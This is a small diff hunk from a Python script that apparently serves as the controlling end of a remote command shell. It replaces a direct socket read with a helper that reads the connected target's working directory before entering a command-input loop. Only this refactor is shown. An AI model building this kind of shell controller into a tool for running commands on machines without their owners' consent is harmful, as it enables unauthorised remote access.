@@ -124,8 +124,9 @@ def recvall(conn, n):
 def send_target_commands(target, conn):
     global s
     conn.send(str.encode(" "))
-    client_response = str(conn.recv(2048), "utf-8")
-    print(client_response, end="")
+    cwd_bytes = read_command_output(conn)
+    cwd = str(cwd_bytes, "utf-8")
+    print(cwd, end="")
     while True:
         try:
             cmd = input()
